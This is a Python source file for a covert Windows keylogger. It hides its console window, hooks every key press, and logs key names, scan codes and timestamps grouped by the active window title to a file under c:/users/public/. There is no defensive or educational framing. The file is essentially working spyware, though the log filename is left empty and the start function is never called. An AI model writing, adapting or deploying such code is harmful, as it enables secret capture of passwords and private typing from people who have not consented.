import keyboard as key
from datetime import datetime
import ctypes

# Required librairies
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Filename
filename = str()

# Hide console
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)


def get_current_window():  # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()  # Get handle to foreground window
    length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar
    buff = ctypes.create_unicode_buffer(
        length + 1
    )  # Create buffer to store the window title string

    GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff
    print(buff.value)

    return buff.value  # Return the value of buff


def get_timestamp():
    return round(datetime.now().timestamp())


def write_to(file, content):
    file.write(content)


def write_key(key):  # key - name, scan_code, time
    global key_info  # String of key info
    global key_list  # List of key names
    global prev_window  # Last window used

    print("BEFORE: ", key_info)
    window = get_current_window()
    if (
        window == prev_window
    ):  # If in same window, add to list of keys used in this window
        key_info.append(
            str(key.name) + " | " + str(key.scan_code) + " | " + str(round(key.time))
        )  # Add key, scan code and timestamp to current list as string
        key_list.append(str(key.name))  # Add key name to list as string
        return
    # If not in same window, write keys to output file.
    content = (
        "Date - "
        + str(datetime.now())
        + " | Timestamp - "
        + str(get_timestamp())
        + "\nWindow - "
        + str(get_current_window())
        + "\nKeys - \n"
        + str("\n".join(key_info))
        + "\n"
        + ", ".join(key_list)
        + "\n"
    )
    out = open("c:/users/public/" + str(filename), "a")
    write_to(out, content)
    out.close()  # Close the files
    key_info = []  # Reset array
    key_list = []  # Reset array
    prev_window = window  # Reset the previous windows
    key_info.append(
        str(key.name) + " | " + str(key.scan_code) + " | " + str(round(key.time))
    )  # Update list with new key, scan code and timestamp
    key_list.append(str(key.name))  # Update list with key name


def prepare():
    global key_info  # String of key info
    global key_list  # List of key names
    global prev_window  # Last window used
    key_info = []
    key_list = []
    prev_window = str()

    key.on_press(write_key)
    key.wait()